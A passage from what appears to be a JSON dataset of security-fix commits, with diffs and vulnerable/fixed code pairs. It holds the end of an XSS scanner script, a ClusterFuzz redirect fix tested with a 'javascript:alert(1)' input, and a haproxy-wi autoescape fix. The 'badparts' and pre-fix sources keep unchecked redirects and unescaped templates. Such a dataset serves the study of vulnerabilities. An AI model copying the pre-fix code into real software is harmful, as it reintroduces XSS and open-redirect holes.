re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\#\\:]+)\"', line, re.M|re.I)\n                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I)\n                if m_action or m_same:\n                    has_form=1\n                    form_counter+=1\n                    if m_same:\n                        page=\"\"\n                    else:\n                        page=m_action.group(1)\n                    rtype=\"get\"\n                    if m_reqtype:\n                        rtype=m_reqtype.group(1)\n                    print \"[+] Form detected. Method \" + rtype.upper()\n\n    except Exception, e:\n        print \"[-] scan_for_forms(): Error \" + str(e)\n\n        #enable the following lines if you want more details\n        #exc_type, exc_obj, exc_tb = sys.exc_info()\n        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]\n        #print(exc_type, fname, exc_tb.tb_lineno)\n\n    return\n\ndef banner():\n    print \"BEstAutomaticXSSFinder v1.0\"\n    print \"DISCLAIMER: For testing purposes only!\\n\"\n\n###MAIN###\nif __name__ == \"__main__\":\n    banner()\n\n    if len(sys.argv) != 2:\n        print \"program [url]\"\n        exit()\n\n    url = sys.argv[1]\n    if url.find(\"http\") != 0:\n        print \"[-] Invalid target\"\n        exit()\n\n    m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M)\n    if m:\n        host = m.group(2)\n    else:\n        print \"[-] Can't get host information\"\n        exit()\n\n    print \"[+] Host acquired \" + host\n    print \"[+] Retrieve page\"\n    try:\n        r = requests.get(url)\n        s = r.content.replace(\">\", \">\\n\")\n\n        #good to have a local copy for testing\n        with open(\"tmpage.txt\", \"w\") as f:\n            f.write(s)\n\n        scan_for_forms(\"tmpage.txt\", host, url)\n        os.remove(\"tmpage.txt\")\n    except Exception, e:\n        print \"[-] Main(): Error \" + str(e)\n\nprint \"[*] Done\"\n"}}, "msg": "improve form detection, add more XSS attacks, add options for XSS/LFI scans, improve help"}}, "https://github.com/google/clusterfuzz": {"3d66c1146550eecd4e34d47332a8616b435a21fe": {"url": "https://api.github.com/repos/google/clusterfuzz/commits/3d66c1146550eecd4e34d47332a8616b435a21fe", "html_url": "https://github.com/google/clusterfuzz/commit/3d66c1146550eecd4e34d47332a8616b435a21fe", "sha": "3d66c1146550eecd4e34d47332a8616b435a21fe", "keyword": "XSS fix", "diff": "diff --git a/src/appengine/handlers/base_handler.py b/src/appengine/handlers/base_handler.py\nindex bade034a..ff5b3e58 100644\n--- a/src/appengine/handlers/base_handler.py\n+++ b/src/appengine/handlers/base_handler.py\n@@ -40,6 +40,12 @@\n from libs import helpers\n from system import environment\n \n+# Pattern from\n+# https://github.com/google/closure-library/blob/\n+# 3037e09cc471bfe99cb8f0ee22d9366583a20c28/closure/goog/html/safeurl.js\n+_SAFE_URL_PATTERN = re.compile(\n+    r'^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))', flags=re.IGNORECASE)\n+\n \n def add_jinja2_filter(name, fn):\n   _JINJA_ENVIRONMENT.filters[name] = fn\n@@ -115,6 +121,12 @@ def make_logout_url(dest_url):\n   })\n \n \n+def check_redirect_url(url):\n+  \"\"\"Check redirect URL is safe.\"\"\"\n+  if not _SAFE_URL_PATTERN.match(url):\n+    raise helpers.EarlyExitException('Invalid redirect.', 403)\n+\n+\n class _MenuItem(object):\n   \"\"\"A menu item used for rendering an item in the main navigation.\"\"\"\n \n@@ -246,7 +258,9 @@ def handle_exception_exception(self):\n   def redirect(self, url, **kwargs):\n     \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect\n     strongly requires 'str' but url might be an unicode string.\"\"\"\n-    super(Handler, self).redirect(str(url), **kwargs)\n+    url = str(url)\n+    check_redirect_url(url)\n+    super(Handler, self).redirect(url, **kwargs)\n \n \n class GcsUploadHandler(Handler):\ndiff --git a/src/appengine/handlers/login.py b/src/appengine/handlers/login.py\nindex bdca9d0b..80175a54 100644\n--- a/src/appengine/handlers/login.py\n+++ b/src/appengine/handlers/login.py\n@@ -32,11 +32,14 @@ class Handler(base_handler.Handler):\n   @handler.get(handler.HTML)\n   def get(self):\n     \"\"\"Handle a get request.\"\"\"\n+    dest = self.request.get('dest')\n+    base_handler.check_redirect_url(dest)\n+\n     self.render(\n         'login.html', {\n             'apiKey': local_config.ProjectConfig().get('firebase.api_key'),\n             'authDomain': auth.auth_domain(),\n-            'dest': self.request.get('dest'),\n+            'dest': dest,\n         })\n \n \ndiff --git a/src/python/tests/appengine/handlers/base_handler_test.py b/src/python/tests/appengine/handlers/base_handler_test.py\nindex 2d25a638..f6b8dc03 100644\n--- a/src/python/tests/appengine/handlers/base_handler_test.py\n+++ b/src/python/tests/appengine/handlers/base_handler_test.py\n@@ -66,6 +66,14 @@ def get(self):\n     raise helpers.AccessDeniedException('this_random_message')\n \n \n+class RedirectHandler(base_handler.Handler):\n+  \"\"\"Redirect handler.\"\"\"\n+\n+  def get(self):\n+    redirect = self.request.get('redirect')\n+    self.redirect(redirect)\n+\n+\n class HandlerTest(unittest.TestCase):\n   \"\"\"Test Handler.\"\"\"\n \n@@ -139,3 +147,23 @@ def test_forbidden_logged_in(self):\n     self.assertEqual(response.status_int, 403)\n     self.assertRegexpMatches(response.body, '.*Access Denied.*')\n     self.assertRegexpMatches(response.body, '.*this_random_message.*')\n+\n+  def test_redirect_another_page(self):\n+    \"\"\"Test redirect to another page.\"\"\"\n+    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))\n+    response = app.get('/?redirect=%2Fanother-page')\n+    self.assertEqual('http://localhost/another-page',\n+                     response.headers['Location'])\n+\n+  def test_redirect_another_domain(self):\n+    \"\"\"Test redirect to another domain.\"\"\"\n+    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))\n+    response = app.get('/?redirect=https%3A%2F%2Fblah.com%2Ftest')\n+    self.assertEqual('https://blah.com/test', response.headers['Location'])\n+\n+  def test_redirect_javascript(self):\n+    \"\"\"Test redirect to a javascript url.\"\"\"\n+    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))\n+    response = app.get(\n+        '/?redirect=javascript%3Aalert%281%29', expect_errors=True)\n+    self.assertEqual(response.status_int, 403)\n", "message": "", "files": {"/src/appengine/handlers/base_handler.py": {"changes": [{"diff": "\n   def redirect(self, url, **kwargs):\n     \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect\n     strongly requires 'str' but url might be an unicode string.\"\"\"\n-    super(Handler, self).redirect(str(url), **kwargs)\n+    url = str(url)\n+    check_redirect_url(url)\n+    super(Handler, self).redirect(url, **kwargs)\n \n \n class GcsUploadHandler(Handler):", "add": 3, "remove": 1, "filename": "/src/appengine/handlers/base_handler.py", "badparts": ["    super(Handler, self).redirect(str(url), **kwargs)"], "goodparts": ["    url = str(url)", "    check_redirect_url(url)", "    super(Handler, self).redirect(url, **kwargs)"]}], "source": "\n \"\"\"The superclass of all handlers.\"\"\" from builtins import object from future import standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging import os import re import sys import traceback import urllib.parse import jinja2 import webapp2 from base import utils from config import db_config from config import local_config from datastore import ndb from google_cloud_utils import storage from libs import auth from libs import form from libs import helpers from system import environment def add_jinja2_filter(name, fn): _JINJA_ENVIRONMENT.filters[name]=fn class JsonEncoder(json.JSONEncoder): \"\"\"Json encoder.\"\"\" _EPOCH=datetime.datetime.utcfromtimestamp(0) def default(self, obj): if isinstance(obj, ndb.Model): dict_obj=obj.to_dict() dict_obj['id']=obj.key.id() return dict_obj elif isinstance(obj, datetime.datetime): return int((obj -self._EPOCH).total_seconds()) elif hasattr(obj, 'to_dict'): return obj.to_dict() elif isinstance(obj, cgi.FieldStorage): return str(obj) else: raise Exception('Cannot serialise %s' % obj) def format_time(dt): \"\"\"Format datetime object for display.\"\"\" return '{t.day}{t:%b}{t:%y}{t:%X} PDT'.format(t=dt) def splitlines(text): \"\"\"Split text into lines.\"\"\" return text.splitlines() def split_br(text): return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE) def encode_json(value): \"\"\"Dump base64-encoded JSON string(to avoid XSS).\"\"\" return base64.b64encode(json.dumps(value, cls=JsonEncoder)) _JINJA_ENVIRONMENT=jinja2.Environment( loader=jinja2.FileSystemLoader( os.path.join(os.path.dirname(__file__), '..', 'templates')), extensions=['jinja2.ext.autoescape'], autoescape=True) _MENU_ITEMS=[] add_jinja2_filter('json', encode_json) add_jinja2_filter('format_time', format_time) add_jinja2_filter('splitlines', splitlines) add_jinja2_filter('split_br', split_br) add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v) def add_menu(name, href): \"\"\"Add menu item to the main navigation.\"\"\" _MENU_ITEMS.append(_MenuItem(name, href)) def make_login_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/login?' +urllib.parse.urlencode({'dest': dest_url}) def make_logout_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/logout?' +urllib.parse.urlencode({ 'csrf_token': form.generate_csrf_token(), 'dest': dest_url, }) class _MenuItem(object): \"\"\"A menu item used for rendering an item in the main navigation.\"\"\" def __init__(self, name, href): self.name=name self.href=href class Handler(webapp2.RequestHandler): \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\" def is_cron(self): \"\"\"Return true if the request is from a cron job.\"\"\" return bool(self.request.headers.get('X-Appengine-Cron')) def render_forbidden(self, message): \"\"\"Write HTML response for 403.\"\"\" login_url=make_login_url(dest_url=self.request.url) user_email=helpers.get_user_email() if not user_email: self.redirect(login_url) return contact_string=db_config.get_value('contact_string') template_values={ 'message': message, 'user_email': helpers.get_user_email(), 'login_url': login_url, 'switch_account_url': login_url, 'logout_url': make_logout_url(dest_url=self.request.url), 'contact_string': contact_string, } self.render('error-403.html', template_values, 403) def _add_security_response_headers(self): \"\"\"Add security-related headers to response.\"\"\" self.response.headers['Strict-Transport-Security']=( 'max-age=2592000; includeSubdomains') self.response.headers['X-Content-Type-Options']='nosniff' self.response.headers['X-Frame-Options']='deny' def render(self, path, values=None, status=200): \"\"\"Write HTML response.\"\"\" if values is None: values={} values['menu_items']=_MENU_ITEMS values['is_oss_fuzz']=utils.is_oss_fuzz() values['is_development']=( environment.is_running_on_app_engine_development()) values['is_logged_in']=bool(helpers.get_user_email()) values['ga_tracking_id']=( local_config.GAEConfig().get('ga_tracking_id') if not auth.is_current_user_admin() else None) if values['is_logged_in']: values['switch_account_url']=make_login_url(self.request.url) values['logout_url']=make_logout_url(dest_url=self.request.url) template=_JINJA_ENVIRONMENT.get_template(path) self._add_security_response_headers() self.response.headers['Content-Type']='text/html' self.response.out.write(template.render(values)) self.response.set_status(status) def before_render_json(self, values, status): \"\"\"A hook for modifying values before render_json.\"\"\" def render_json(self, values, status=200): \"\"\"Write JSON response.\"\"\" self._add_security_response_headers() self.response.headers['Content-Type']='application/json' self.before_render_json(values, status) self.response.out.write(json.dumps(values, cls=JsonEncoder)) self.response.set_status(status) def handle_exception(self, exception, _): \"\"\"Catch exception and format it properly.\"\"\" try: status=500 values={ 'message': exception.message, 'email': helpers.get_user_email(), 'traceDump': traceback.format_exc(), 'status': status, 'type': exception.__class__.__name__ } if isinstance(exception, helpers.EarlyExitException): status=exception.status values=exception.to_dict() values['params']=self.request.params.dict_of_lists() if status >=400 and status <=499: logging.info(json.dumps(values, cls=JsonEncoder)) del values['traceDump'] else: logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, status) else: if status==403 or status==401: self.render_forbidden(exception.message) else: self.render('error.html', values, status) except Exception: self.handle_exception_exception() def handle_exception_exception(self): \"\"\"Catch exception in handle_exception and format it properly.\"\"\" exception=sys.exc_info()[1] values={'message': exception.message, 'traceDump': traceback.format_exc()} logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, 500) else: self.render('error.html', values, 500) def redirect(self, url, **kwargs): \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect strongly requires 'str' but url might be an unicode string.\"\"\" super(Handler, self).redirect(str(url), **kwargs) class GcsUploadHandler(Handler): \"\"\"A handler which uploads files to GCS.\"\"\" def __init__(self, request, response): self.initialize(request, response) self.upload=None def get_upload(self): \"\"\"Get uploads.\"\"\" if self.upload: return self.upload upload_key=self.request.get('upload_key') if not upload_key: return None blob_info=storage.GcsBlobInfo.from_key(upload_key) if not blob_info: raise helpers.EarlyExitException('Failed to upload.', 500) self.upload=blob_info return self.upload ", "sourceWithComments": "# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"The superclass of all handlers.\"\"\"\n\nfrom builtins import object\nfrom future import standard_library\nstandard_library.install_aliases()\nimport base64\nimport cgi\nimport datetime\nimport json\nimport logging\nimport os\nimport re\nimport sys\nimport traceback\nimport urllib.parse\n\nimport jinja2\nimport webapp2\n\nfrom base import utils\nfrom config import db_config\nfrom config import local_config\nfrom datastore import ndb\nfrom google_cloud_utils import storage\nfrom libs import auth\nfrom libs import form\nfrom libs import helpers\nfrom system import environment\n\n\ndef add_jinja2_filter(name, fn):\n  _JINJA_ENVIRONMENT.filters[name] = fn\n\n\nclass JsonEncoder(json.JSONEncoder):\n  \"\"\"Json encoder.\"\"\"\n  _EPOCH = datetime.datetime.utcfromtimestamp(0)\n\n  def default(self, obj):  # pylint: disable=arguments-differ,method-hidden\n    if isinstance(obj, ndb.Model):\n      dict_obj = obj.to_dict()\n      dict_obj['id'] = obj.key.id()\n      return dict_obj\n    elif isinstance(obj, datetime.datetime):\n      return int((obj - self._EPOCH).total_seconds())\n    elif hasattr(obj, 'to_dict'):\n      return obj.to_dict()\n    elif isinstance(obj, cgi.FieldStorage):\n      return str(obj)\n    else:\n      raise Exception('Cannot serialise %s' % obj)\n\n\ndef format_time(dt):\n  \"\"\"Format datetime object for display.\"\"\"\n  return '{t.day} {t:%b} {t:%y} {t:%X} PDT'.format(t=dt)\n\n\ndef splitlines(text):\n  \"\"\"Split text into lines.\"\"\"\n  return text.splitlines()\n\n\ndef split_br(text):\n  return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE)\n\n\ndef encode_json(value):\n  \"\"\"Dump base64-encoded JSON string (to avoid XSS).\"\"\"\n  return base64.b64encode(json.dumps(value, cls=JsonEncoder))\n\n\n_JINJA_ENVIRONMENT = jinja2.Environment(\n    loader=jinja2.FileSystemLoader(\n        os.path.join(os.path.dirname(__file__), '..', 'templates')),\n    extensions=['jinja2.ext.autoescape'],\n    autoescape=True)\n_MENU_ITEMS = []\n\nadd_jinja2_filter('json', encode_json)\nadd_jinja2_filter('format_time', format_time)\nadd_jinja2_filter('splitlines', splitlines)\nadd_jinja2_filter('split_br', split_br)\nadd_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v)\n\n\ndef add_menu(name, href):\n  \"\"\"Add menu item to the main navigation.\"\"\"\n  _MENU_ITEMS.append(_MenuItem(name, href))\n\n\ndef make_login_url(dest_url):\n  \"\"\"Make the switch account url.\"\"\"\n  return '/login?' + urllib.parse.urlencode({'dest': dest_url})\n\n\ndef make_logout_url(dest_url):\n  \"\"\"Make the switch account url.\"\"\"\n  return '/logout?' + urllib.parse.urlencode({\n      'csrf_token': form.generate_csrf_token(),\n      'dest': dest_url,\n  })\n\n\nclass _MenuItem(object):\n  \"\"\"A menu item used for rendering an item in the main navigation.\"\"\"\n\n  def __init__(self, name, href):\n    self.name = name\n    self.href = href\n\n\nclass Handler(webapp2.RequestHandler):\n  \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\"\n\n  def is_cron(self):\n    \"\"\"Return true if the request is from a cron job.\"\"\"\n    return bool(self.request.headers.get('X-Appengine-Cron'))\n\n  def render_forbidden(self, message):\n    \"\"\"Write HTML response for 403.\"\"\"\n    login_url = make_login_url(dest_url=self.request.url)\n    user_email = helpers.get_user_email()\n    if not user_email:\n      self.redirect(login_url)\n      return\n\n    contact_string = db_config.get_value('contact_string')\n    template_values = {\n        'message': message,\n        'user_email': helpers.get_user_email(),\n        'login_url': login_url,\n        'switch_account_url': login_url,\n        'logout_url': make_logout_url(dest_url=self.request.url),\n        'contact_string': contact_string,\n    }\n    self.render('error-403.html', template_values, 403)\n\n  def _add_security_response_headers(self):\n    \"\"\"Add security-related headers to response.\"\"\"\n    self.response.headers['Strict-Transport-Security'] = (\n        'max-age=2592000; includeSubdomains')\n    self.response.headers['X-Content-Type-Options'] = 'nosniff'\n    self.response.headers['X-Frame-Options'] = 'deny'\n\n  def render(self, path, values=None, status=200):\n    \"\"\"Write HTML response.\"\"\"\n    if values is None:\n      values = {}\n\n    values['menu_items'] = _MENU_ITEMS\n    values['is_oss_fuzz'] = utils.is_oss_fuzz()\n    values['is_development'] = (\n        environment.is_running_on_app_engine_development())\n    values['is_logged_in'] = bool(helpers.get_user_email())\n\n    # Only track analytics for non-admin users.\n    values['ga_tracking_id'] = (\n        local_config.GAEConfig().get('ga_tracking_id')\n        if not auth.is_current_user_admin() else None)\n\n    if values['is_logged_in']:\n      values['switch_account_url'] = make_login_url(self.request.url)\n      values['logout_url'] = make_logout_url(dest_url=self.request.url)\n\n    template = _JINJA_ENVIRONMENT.get_template(path)\n\n    self._add_security_response_headers()\n    self.response.headers['Content-Type'] = 'text/html'\n    self.response.out.write(template.render(values))\n    self.response.set_status(status)\n\n  def before_render_json(self, values, status):\n    \"\"\"A hook for modifying values before render_json.\"\"\"\n\n  def render_json(self, values, status=200):\n    \"\"\"Write JSON response.\"\"\"\n    self._add_security_response_headers()\n    self.response.headers['Content-Type'] = 'application/json'\n    self.before_render_json(values, status)\n    self.response.out.write(json.dumps(values, cls=JsonEncoder))\n    self.response.set_status(status)\n\n  def handle_exception(self, exception, _):\n    \"\"\"Catch exception and format it properly.\"\"\"\n    try:\n\n      status = 500\n      values = {\n          'message': exception.message,\n          'email': helpers.get_user_email(),\n          'traceDump': traceback.format_exc(),\n          'status': status,\n          'type': exception.__class__.__name__\n      }\n      if isinstance(exception, helpers.EarlyExitException):\n        status = exception.status\n        values = exception.to_dict()\n      values['params'] = self.request.params.dict_of_lists()\n\n      # 4XX is not our fault. Therefore, we hide the trace dump and log on\n      # the INFO level.\n      if status >= 400 and status <= 499:\n        logging.info(json.dumps(values, cls=JsonEncoder))\n        del values['traceDump']\n      else:  # Other error codes should be logged with the EXCEPTION level.\n        logging.exception(exception)\n\n      if helpers.should_render_json(\n          self.request.headers.get('accept', ''),\n          self.response.headers.get('Content-Type')):\n        self.render_json(values, status)\n      else:\n        if status == 403 or status == 401:\n          self.render_forbidden(exception.message)\n        else:\n          self.render('error.html', values, status)\n    except Exception:\n      self.handle_exception_exception()\n\n  def handle_exception_exception(self):\n    \"\"\"Catch exception in handle_exception and format it properly.\"\"\"\n    exception = sys.exc_info()[1]\n    values = {'message': exception.message, 'traceDump': traceback.format_exc()}\n    logging.exception(exception)\n    if helpers.should_render_json(\n        self.request.headers.get('accept', ''),\n        self.response.headers.get('Content-Type')):\n      self.render_json(values, 500)\n    else:\n      self.render('error.html', values, 500)\n\n  def redirect(self, url, **kwargs):\n    \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect\n    strongly requires 'str' but url might be an unicode string.\"\"\"\n    super(Handler, self).redirect(str(url), **kwargs)\n\n\nclass GcsUploadHandler(Handler):\n  \"\"\"A handler which uploads files to GCS.\"\"\"\n\n  def __init__(self, request, response):\n    self.initialize(request, response)\n    self.upload = None\n\n  def get_upload(self):\n    \"\"\"Get uploads.\"\"\"\n    if self.upload:\n      return self.upload\n\n    upload_key = self.request.get('upload_key')\n    if not upload_key:\n      return None\n\n    blob_info = storage.GcsBlobInfo.from_key(upload_key)\n    if not blob_info:\n      raise helpers.EarlyExitException('Failed to upload.', 500)\n\n    self.upload = blob_info\n    return self.upload\n"}, "/src/appengine/handlers/login.py": {"changes": [{"diff": "\n   @handler.get(handler.HTML)\n   def get(self):\n     \"\"\"Handle a get request.\"\"\"\n+    dest = self.request.get('dest')\n+    base_handler.check_redirect_url(dest)\n+\n     self.render(\n         'login.html', {\n             'apiKey': local_config.ProjectConfig().get('firebase.api_key'),\n             'authDomain': auth.auth_domain(),\n-            'dest': self.request.get('dest'),\n+            'dest': dest,\n         })\n \n", "add": 4, "remove": 1, "filename": "/src/appengine/handlers/login.py", "badparts": ["            'dest': self.request.get('dest'),"], "goodparts": ["    dest = self.request.get('dest')", "    base_handler.check_redirect_url(dest)", "            'dest': dest,"]}], "source": "\n \"\"\"Login page.\"\"\" import datetime from config import local_config from handlers import base_handler from libs import auth from libs import handler from libs import helpers from metrics import logs SESSION_EXPIRY_DAYS=14 class Handler(base_handler.Handler): \"\"\"Login page.\"\"\" @handler.unsupported_on_local_server @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"\" self.render( 'login.html',{ 'apiKey': local_config.ProjectConfig().get('firebase.api_key'), 'authDomain': auth.auth_domain(), 'dest': self.request.get('dest'), }) class SessionLoginHandler(base_handler.Handler): \"\"\"Session login handler.\"\"\" @handler.post(handler.JSON, handler.JSON) def post(self): \"\"\"Handle a post request.\"\"\" id_token=self.request.get('idToken') expires_in=datetime.timedelta(days=SESSION_EXPIRY_DAYS) try: session_cookie=auth.create_session_cookie(id_token, expires_in) except auth.AuthError: raise helpers.EarlyExitException('Failed to create session cookie.', 401) expires=datetime.datetime.now() +expires_in self.response.set_cookie( 'session', session_cookie, expires=expires, httponly=True, secure=True, overwrite=True) self.render_json({'status': 'success'}) class LogoutHandler(base_handler.Handler): \"\"\"Log out handler.\"\"\" @handler.unsupported_on_local_server @handler.require_csrf_token @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"\" try: auth.revoke_session_cookie(auth.get_session_cookie()) except auth.AuthError: logs.log_error('Failed to revoke session cookie.') self.response.delete_cookie('session') self.redirect(self.request.get('dest')) ", "sourceWithComments": "# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Login page.\"\"\"\n\nimport datetime\n\nfrom config import local_config\nfrom handlers import base_handler\nfrom libs import auth\nfrom libs import handler\nfrom libs import helpers\nfrom metrics import logs\n\nSESSION_EXPIRY_DAYS = 14\n\n\nclass Handler(base_handler.Handler):\n  \"\"\"Login page.\"\"\"\n\n  @handler.unsupported_on_local_server\n  @handler.get(handler.HTML)\n  def get(self):\n    \"\"\"Handle a get request.\"\"\"\n    self.render(\n        'login.html', {\n            'apiKey': local_config.ProjectConfig().get('firebase.api_key'),\n            'authDomain': auth.auth_domain(),\n            'dest': self.request.get('dest'),\n        })\n\n\nclass SessionLoginHandler(base_handler.Handler):\n  \"\"\"Session login handler.\"\"\"\n\n  @handler.post(handler.JSON, handler.JSON)\n  def post(self):\n    \"\"\"Handle a post request.\"\"\"\n    id_token = self.request.get('idToken')\n    expires_in = datetime.timedelta(days=SESSION_EXPIRY_DAYS)\n    try:\n      session_cookie = auth.create_session_cookie(id_token, expires_in)\n    except auth.AuthError:\n      raise helpers.EarlyExitException('Failed to create session cookie.', 401)\n\n    expires = datetime.datetime.now() + expires_in\n    self.response.set_cookie(\n        'session',\n        session_cookie,\n        expires=expires,\n        httponly=True,\n        secure=True,\n        overwrite=True)\n    self.render_json({'status': 'success'})\n\n\nclass LogoutHandler(base_handler.Handler):\n  \"\"\"Log out handler.\"\"\"\n\n  @handler.unsupported_on_local_server\n  @handler.require_csrf_token\n  @handler.get(handler.HTML)\n  def get(self):\n    \"\"\"Handle a get request.\"\"\"\n    try:\n      auth.revoke_session_cookie(auth.get_session_cookie())\n    except auth.AuthError:\n      # Even if the revoke failed, remove the cookie.\n      logs.log_error('Failed to revoke session cookie.')\n\n    self.response.delete_cookie('session')\n    self.redirect(self.request.get('dest'))\n"}}, "msg": "Fix XSS with redirects. (#874)"}}, "https://github.com/Aidaho12/haproxy-wi": {"ba79e7301c5574b91b719298c56fd5129c46cca3": {"url": "https://api.github.com/repos/Aidaho12/haproxy-wi/commits/ba79e7301c5574b91b719298c56fd5129c46cca3", "html_url": "https://github.com/Aidaho12/haproxy-wi/commit/ba79e7301c5574b91b719298c56fd5129c46cca3", "sha": "ba79e7301c5574b91b719298c56fd5129c46cca3", "keyword": "XSS protect", "diff": "diff --git a/app/config.py b/app/config.py\nindex 8c2ae80..e994424 100644\n--- a/app/config.py\n+++ b/app/config.py\n@@ -5,7 +5,7 @@\n import funct\n import sql\n from jinja2 import Environment, FileSystemLoader\n-env = Environment(loader=FileSystemLoader('templates/'))\n+env = Environment(loader=FileSystemLoader('templates/'), autoescape=True)\n template = env.get_template('config.html')\n \n print('Content-type: text/html\\n')\ndiff --git a/app/funct.py b/app/funct.py\nindex 79c972b..336c154 100644\n--- a/app/funct.py\n+++ b/app/funct.py\n@@ -137,7 +137,7 @@ def page_for_admin(**kwargs):\n \tgive_level = 1\n \tgive_level = kwargs.get(\"level\")\n \t\t\n-\tif not is_admin(level = give_level):\n+\tif not is_admin(level=give_level):\n \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>')\n \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">')\n \t\timport sys\ndiff --git a/app/options.py b/app/options.py\nindex 7993295..87ca0e9 100644\n--- a/app/options.py\n+++ b/app/options.py\n@@ -295,7 +295,7 @@\n if act == \"showCompareConfigs\":\n \timport glob\n \tfrom jinja2 import Environment, FileSystemLoader\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True)\n \ttemplate = env.get_template('/show_compare_configs.html')\n \tleft = form.getvalue('left')\n \tright = form.getvalue('right')\n@@ -309,7 +309,7 @@\n \tright = form.getvalue('right')\n \thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n \tcmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)\t\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n \ttemplate = env.get_template('compare.html')\n \t\n \toutput, stderr = funct.subprocess_execute(cmd)\n@@ -329,11 +329,13 @@\n \t\t\t\n \ttry:\n \t\tconf = open(cfg, \"r\")\n+\t\t#conf = conf.read()\n+\t\t#conf = funct.escape_html(conf)\n \texcept IOError:\n \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>')\n \t\t\n \tfrom jinja2 import Environment, FileSystemLoader\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols'])\n \ttemplate = env.get_template('config_show.html')\n \t\n \ttemplate = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t\t\t\ndiff --git a/app/templates/base.html b/app/templates/base.html\nindex a11c42d..ab5fdb3 100644\n--- a/app/templates/base.html\n+++ b/app/templates/base.html\n@@ -115,7 +115,7 @@\n \t\t\t\t\t</ul>\n \t\t\t\t</nav>\n \t\t\t\t<div class=\"copyright-menu\">\n-\t\t\t\t\t<a href=\"https://github.com/aidaho12/haproxy-wi/\" title=\"Github repo\" target=\"_blank\" style=\"color: #fff\">HAproxy-WI v3.4.4.4</a>\n+\t\t\t\t\t<a href=\"https://github.com/aidaho12/haproxy-wi/\" title=\"Github repo\" target=\"_blank\" style=\"color: #fff\">HAproxy-WI v3.4.4.5</a>\n \t\t\t\t\t<br>\n \t\t\t\t\t<a href=\"https://www.patreon.com/haproxy_wi\" title=\"Donate\" target=\"_blank\" style=\"color: #fff; margin-left: 30px; color: red;\" class=\"patreon\">  Patreon</a>\n \t\t\t\t</div>\n", "message": "", "files": {"/app/config.py": {"changes": [{"diff": "\n import funct\n import sql\n from jinja2 import Environment, FileSystemLoader\n-env = Environment(loader=FileSystemLoader('templates/'))\n+env = Environment(loader=FileSystemLoader('templates/'), autoescape=True)\n template = env.get_template('config.html')\n \n print('Content-type: text/html\\n')", "add": 1, "remove": 1, "filename": "/app/config.py", "badparts": ["env = Environment(loader=FileSystemLoader('templates/'))"], "goodparts": ["env = Environment(loader=FileSystemLoader('templates/'), autoescape=True)"]}], "source": "\n\nimport cgi import os import http.cookies import funct import sql from jinja2 import Environment, FileSystemLoader env=Environment(loader=FileSystemLoader('templates/')) template=env.get_template('config.html') print('Content-type: text/html\\n') funct.check_login() form=cgi.FieldStorage() serv=form.getvalue('serv') config_read=\"\" cfg=\"\" stderr=\"\" error=\"\" aftersave=\"\" try: \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \tuser=sql.get_user_name_by_uuid(user_id.value) \tservers=sql.get_dick_permit() \ttoken=sql.get_token(user_id.value) 